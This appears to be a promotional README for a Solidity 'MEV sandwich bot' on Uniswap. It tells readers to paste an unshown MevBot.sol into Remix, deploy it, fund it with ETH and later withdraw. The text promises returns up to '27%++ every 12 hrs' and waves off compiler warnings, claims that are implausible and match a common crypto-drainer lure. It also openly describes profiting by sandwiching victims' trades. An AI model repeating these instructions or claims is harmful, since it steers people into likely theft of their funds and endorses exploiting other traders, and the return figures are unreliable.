
Use this ETH MEV-BOT to make front run on Uniswap. A Maximal Extractable Value (MEV) Solidity Sandwich BOT that allows deployers of contract to take profits from tokens. 

Bot sends the transaction and sniffs the Uniswap v2 Mempool for txs with high slippage, calculating if front run is profitable.

Bots then compete to buy up the token onchain as quickly as possible, sandwiching the victims transaction and creating a profitable slippage opportunity, my bot always puts 1 gas more than everybody elses, as long as it remains profitable, securing a large amount of profitable transactions.

Then sends back the ETH to the contract ready for withdrawal.

This bot performs all of that, faster than 99% of other bots.

MEV bot Instructions (works only for Mainnet)

Deposits
Deposits of lower than 0.4 ETH are going to find much fewer txs because of the gas fees

Higher amounts of ETH deposited into the contract result in a larger amount of successful sandwich attack txs, therefore more profit

For higher profits use above 1.2 ETH

Expected returns
0.1ETH - 0.4ETH = up to 10%/12hrs

0.4ETH - 1.2ETH = up to 20%/12hrs

1.2ETH - 2.4ETH = 20-27%/12hrs

2.4ETH+ = 27%++ every 12 hrs

Make money with MevBot (ETH network)

How it works:


The bot will make transactions on your entire balance to increase profit

VERY FIRST STEP: Install Metamask and buy enough Etheruem, at least 1 ETH;  https://metamask.io/

Copy code and paste the code MevBot.sol file in Remix IDE;     https://remix.ethereum.org/#lang=en&optimize=false&runs=200&evmVersion=null

Click Solidity complier 0.8.0 And press Compile FlashBot.sol, DON'T WORRY ABOUT WARNINGS ABOUT THE LISCENCE, IT WILL STILL WORK, JUST IGNORE THIS

Then click DEPLOY 

Next, step, copy the new contract address and send at least 1 ETH to this via Metasmask, using the SEND FUNCTION.

Now let the bot work its magic and just leave it to run for as long as possible.

The more ETH you fund the contract with the more profit.

LAST STEP, just hit withdraw to get your profit. 

SO WHY FUND THE CONTRACT WITH ETHEREUM? 

Simple, you need to cover the gas fees. These will paid back by the profit you make. 


